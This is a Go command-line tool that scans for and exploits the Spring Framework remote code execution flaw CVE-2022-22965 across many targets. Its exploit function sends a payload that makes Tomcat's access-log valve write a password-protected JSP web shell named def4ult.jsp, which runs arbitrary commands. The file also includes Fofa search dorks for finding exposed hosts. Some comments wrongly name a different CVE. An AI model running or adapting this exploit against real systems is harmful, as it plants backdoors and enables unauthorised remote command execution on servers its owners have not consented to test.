package main

import (
	"bufio"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"github.com/go-resty/resty/v2"
	"github.com/panjf2000/ants/v2"
	"github.com/projectdiscovery/gologger"
	"github.com/projectdiscovery/gologger/levels"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

const (
	// HTTP defines the plain http scheme
	HTTP = "http://"
	// HTTPS defines the secure http scheme
	HTTPS = "https://"
)

var finalresult []string

// VulnInfo contains the Vulnerability information about CVE-2021-41277
type VulnInfo struct {
	Name         string
	VulID        string
	Version      string
	Author       string
	VulDate      string
	References   []string
	AppName      string
	AppPowerLink string
	AppVersion   string
	VulType      string
	Description  string
	Category     string
	Dork         QueryDork
}

type QueryDork struct {
	Fofa    string
	Quake   string
	Zoomeye string
	Shodan  string
}

func showInfo() {
	info := VulnInfo{
		Name:         "CVE-2022-22965",
		VulID:        "nil",
		Version:      "1.0",
		Author:       "",
		VulDate:      "2022-03-30",
		References:   []string{"https://nosec.org/home/detail/4983.html"},
		AppName:      "Spring Core",
		AppPowerLink: "https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement",
		AppVersion:   "ALL",
		VulType:      "RCE",
		Description:  "An unauthenticated attacker can use this vulnerability to perform remote arbitrary code execution. The vulnerability is widespread in the Spring framework and derived frameworks, and JDK 9.0 and above are affected.",
		Category:     "REMOTE",
		Dork:         QueryDork{Fofa: `app="APACHE-Tomcat" || app="vmware-SpringBoot-framework" || app="vmware-SpringBoot-framework" || app="vmware-Spring-Batch" || app="vmware-Spring-framework" || app="vmware-Spring-Security"`},
	}

	vulnJson, err := json.MarshalIndent(info, "", "  ")
	if err != nil {
		fmt.Println(err)
	}
	fmt.Print(string(vulnJson))

}

// Options contains the configuration options
type Options struct {
	Verbose     bool   // Verbose flag indicates whether to show verbose output or not
	ShowInfo    bool   //ShowInfo is a flag indicates whether to show vuln info output or not
	Exploit     bool   //ShowInfo is a flag indicates whether to show vuln info output or not
	Stdin       bool   // Stdin specifies whether stdin input was given to the process
	Timeout     int    // Timeout is the seconds to wait for sources to respond
	Module      string // Module to specify which function module to use (verify or exploit)
	Target      string // Target to verfity CVE-2021-41277
	TargetsFile string // TargetsFile containing list of targets to verfity
	Threads     int    // Thread controls the number of threads to use for active enumerations
	Output      io.Writer
	OutputFile  string // Output is the file to write found subdomains to.
}

// parseOptions parses the command line flags provided by a user
func parseOptions() *Options {
	options := &Options{}
	flag.BoolVar(&options.Verbose, "v", false, "Show Verbose output")
	flag.BoolVar(&options.ShowInfo, "s", false, "Show VulnInfo output")
	flag.IntVar(&options.Threads, "t", 10, "Number of concurrent goroutines for resolving")
	flag.StringVar(&options.Module, "m", "verify", "specify which function module to use (verify or exploit)")
	flag.StringVar(&options.Target, "u", "", "Target to verfity CVE-2021-41277")
	flag.StringVar(&options.TargetsFile, "f", "", "File containing list of targets to verfity")
	flag.StringVar(&options.OutputFile, "o", "", "File to write output to (optional)")
	flag.Parse()

	// Default output is stdout
	options.Output = os.Stdout

	// Check if stdin pipe was given
	options.Stdin = hasStdin()

	if options.ShowInfo {
		gologger.Info().Msg("VulnInfo:\n")
		showInfo()
		os.Exit(0)
	}

	if options.Verbose {
		gologger.DefaultLogger.SetMaxLevel(levels.LevelVerbose)
	} else {
		gologger.DefaultLogger.SetMaxLevel(levels.LevelSilent)
	}

	// Validate the options passed by the user and if any
	// invalid options have been used, exit.
	err := options.validateOptions()
	if err != nil {
		gologger.Fatal().Msgf("Program exiting: %s\n", err)
	}

	return options
}

func hasStdin() bool {
	stat, err := os.Stdin.Stat()
	if err != nil {
		return false
	}

	isPipedFromChrDev := (stat.Mode() & os.ModeCharDevice) == 0
	isPipedFromFIFO := (stat.Mode() & os.ModeNamedPipe) != 0

	return isPipedFromChrDev || isPipedFromFIFO
}

// validateOptions validates the configuration options passed
func (options *Options) validateOptions() error {
	// Check if target, list of targets, or stdin info was provided.
	// If none was provided, then return.
	if options.Target == "" && options.TargetsFile == "" && !options.Stdin {
		return errors.New("no input list provided")
	}

	if options.Threads == 0 {
		return errors.New("threads cannot be zero")
	}

	if options.Module != "exploit" && options.Module != "verify" {
		return errors.New("module can only be verify or exploit")
	}

	return nil
}

func targetParser(target string) []string {
	if !(strings.HasPrefix(target, HTTP) || strings.HasPrefix(target, HTTPS)) {
		res := []string{HTTP + target, HTTPS + target}
		return res
	}
	res := []string{target}
	return res
}

func checkMethodOne(target interface{}) string {
	t := target.(string)
	client1 := resty.New()
	client1.SetTimeout(15 * time.Second)
	resp1, err := client1.R().SetQueryParam("class.module.classLoader.DefaultAssertionStatus", "true").Get(t)
	if err != nil {
		gologger.Warning().Msg("Request1 error: " + t)
		return ""
	} else {
		if resp1.StatusCode() == http.StatusOK {
			//第2个请求(发送如下数据包获取400)
			client2 := resty.New()
			client2.SetTimeout(15 * time.Second)
			resp2, err := client2.R().SetQueryParam("class.module.classLoader.DefaultAssertionStatus", "x").Get(t)
			if err != nil {
				gologger.Warning().Msg("Request2 error: " + t)
				return ""
			} else {
				if resp2.StatusCode() == http.StatusBadRequest {
					gologger.Info().Msg(t + " is vulnerable")
					//finalresult = append(finalresult, t)
					return t
				}
			}
		} else {
			client3 := resty.New()
			client3.SetTimeout(15 * time.Second)
			resp3, err := client3.R().SetHeader("Content-Type", "application/x-www-form-urlencoded").SetBody("class.module.classLoader.DefaultAssertionStatus=true").Post(t)
			if err != nil {
				gologger.Warning().Msg("Request3 error: " + t)
				return ""
			} else {
				if resp3.StatusCode() == http.StatusOK {
					client4 := resty.New()
					client4.SetTimeout(15 * time.Second)
					resp4, err := client3.R().SetHeader("Content-Type", "application/x-www-form-urlencoded").SetBody("class.module.classLoader.DefaultAssertionStatus=x").Post(t)
					if err != nil {
						gologger.Warning().Msg("Request4 error: " + t)
						return ""
					} else {
						if resp4.StatusCode() == http.StatusBadRequest {
							gologger.Info().Msg(t + " is vulnerable")
							//finalresult = append(finalresult, t)
							return t
						} else {
							//gologger.Warning().Msg("no vulnerable")
							return ""
						}
					}
				} else {
					//gologger.Warning().Msg("no vulnerable")
					return ""
				}
			}
		}
	}
	return ""
}

func checkMethodTwo(target interface{}) string {
	t := target.(string)
	client1 := resty.New()
	client1.SetTimeout(15 * time.Second)
	resp1, err := client1.R().SetQueryParam("class.module.classLoader.URLs[a0]", "").Get(t)
	if err != nil {
		gologger.Warning().Msg("Request1 error: " + t)
		return ""
	} else {
		if resp1.StatusCode() == http.StatusBadRequest || resp1.StatusCode() == http.StatusInternalServerError {
			gologger.Info().Msg(t + " is vulnerable")
			//finalresult = append(finalresult, t)
			return t
		} else {
			client2 := resty.New()
			client2.SetTimeout(15 * time.Second)
			resp2, err := client2.R().SetHeader("Content-Type", "application/x-www-form-urlencoded").SetBody("class.module.classLoader.URLs[a0]=").Post(t)
			if err != nil {
				gologger.Warning().Msg("Request2 error: " + t)
				return ""
			} else {
				if resp2.StatusCode() == http.StatusInternalServerError {
					gologger.Info().Msg(t + " is vulnerable")
					//finalresult = append(finalresult, t)
					return t
				} else {
					//gologger.Warning().Msg("no vulnerable")
					return ""
				}
			}
		}
	}
}

func verify(target interface{}) {
	resultOne := checkMethodOne(target)
	if resultOne != "" {
		finalresult = append(finalresult, resultOne)
	} else {
		resultTwo := checkMethodTwo(target)
		if resultTwo != "" {
			finalresult = append(finalresult, resultTwo)
		} else {
			gologger.Warning().Msg("no vulnerable")
		}
	}
}

func checkAlive(target string) bool {
	client := resty.New()
	client.SetTimeout(15 * time.Second)
	_, err := client.R().EnableTrace().Get(target)
	if err != nil {
		gologger.Warning().Msg("Request error: " + target + " not start exploit")
		return false
	} else {
		return true
	}
}

func exploit(target interface{}) {
	t := target.(string)
	url := t + "/def4ult.jsp"

	if checkAlive(t) {
		client := resty.New()
		client.SetTimeout(15 * time.Second)
		client.SetHeaders(map[string]string{
			"suffix":       "%>//",
			"c1":           "Runtime",
			"c2":           "<%",
			"DNT":          "1",
			"Content-Type": "application/x-www-form-urlencoded",
		})

		resp, err := client.R().SetBody([]byte(`class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22rat%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT/&class.module.classLoader.resources.context.parent.pipeline.first.prefix=def4ult&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=`)).Post(t)
		fmt.Println("Status:", resp.Status())
		for key, value := range resp.Header() {
			fmt.Println(key, "=", value)
		}
		if err != nil {
			gologger.Warning().Msg("Request error: " + t)
		} else {
			shellclient := resty.New()
			shellclient.SetTimeout(15 * time.Second)
			shellresp, err := client.R().Get(url)
			fmt.Println("Status:", shellresp.Status())
			if err != nil {
				gologger.Warning().Msg("Request error: " + t)
			} else {
				if shellresp.StatusCode() == http.StatusOK {
					gologger.Info().Msg(url + " is vulnerable")
					finalresult = append(finalresult, url)
				} else {
					gologger.Warning().Msg("no vulnerable")
				}
			}
		}
	}
}

func createFile(filename string, appendtoFile bool) (*os.File, error) {
	if filename == "" {
		return nil, errors.New("empty filename")
	}

	dir := filepath.Dir(filename)

	if dir != "" {
		if _, err := os.Stat(dir); os.IsNotExist(err) {
			err := os.MkdirAll(dir, os.ModePerm)
			if err != nil {
				return nil, err
			}
		}
	}

	var file *os.File
	var err error
	if appendtoFile {
		file, err = os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	} else {
		file, err = os.Create(filename)
	}
	if err != nil {
		return nil, err
	}

	return file, nil
}

func writePlainResult(results []string, writer io.Writer) error {
	bufwriter := bufio.NewWriter(writer)
	sb := &strings.Builder{}

	for _, result := range results {
		sb.WriteString(result)
		sb.WriteString("\n")

		_, err := bufwriter.WriteString(sb.String())
		if err != nil {
			bufwriter.Flush()
			return err
		}
		sb.Reset()
	}
	return bufwriter.Flush()
}

func runner(options *Options) error {
	targets := []string{}
	outputs := []io.Writer{options.Output}

	if options.OutputFile != "" {
		file, err := createFile(options.OutputFile, false)
		if err != nil {
			gologger.Error().Msgf("Could not create file %s for %s: %s\n", options.OutputFile, options.Target, err)
			return err
		}
		defer file.Close()

		outputs = append(outputs, file)
	}

	if options.Target != "" {
		// If output file specified, create file
		targets = targetParser(options.Target)
	}

	if options.TargetsFile != "" {
		reader, err := os.Open(options.TargetsFile)
		if err != nil {
			return err
		}
		scanner := bufio.NewScanner(reader)
		for scanner.Scan() {
			target := scanner.Text()
			if target == "" {
				continue
			}
			targets = append(targets, targetParser(target)...)
		}
		reader.Close()
		return err
	}

	if options.Stdin {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			target := scanner.Text()
			if target == "" {
				continue
			}
			targets = append(targets, targetParser(target)...)
		}
	}

	wg := sync.WaitGroup{}

	var execFunc func(i interface{})
	if options.Module == "exploit" {
		execFunc = exploit
	} else {
		execFunc = verify
	}

	p, _ := ants.NewPoolWithFunc(options.Threads, func(i interface{}) {
		execFunc(i)
		wg.Done()
	})
	defer p.Release()
	for _, t := range targets {
		//gologger.Info().Msg(t)
		wg.Add(1)
		_ = p.Invoke(t)
	}
	wg.Wait()

	var err error
	for _, w := range outputs {
		err = writePlainResult(finalresult, w)
		if err != nil {
			gologger.Error().Msgf("Could not verbose results, Error: %s\n", err)
			return err
		}
	}

	return nil
}

func main() {

	// Parse the command line flags
	options := parseOptions()
	//fmt.Print(options)
	err := runner(options)
	if err != nil {
		gologger.Error().Msg("Runner Error")
	}
}
